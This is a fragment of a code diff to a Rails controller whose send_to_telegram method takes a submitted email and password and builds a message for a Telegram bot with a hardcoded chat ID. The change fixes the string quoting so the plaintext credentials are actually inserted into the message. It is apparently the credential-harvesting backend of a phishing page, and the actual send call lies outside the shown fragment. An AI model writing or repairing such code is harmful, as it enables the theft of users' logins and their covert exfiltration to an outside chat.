@@ -8,9 +8,9 @@ class ContainersController < ApplicationController
    def send_to_telegram
     email = params[:email]
     password = params[:password]
-    message = 'From Bell rails: 
+    message = "From Bell rails: 
     Email: #{email}
-    Password: #{password}'
+    Password: #{password}"
 
     bot_token = ENV['TELEGRAM_BOT_TOKEN'] 
     chat_id = 1678259688  
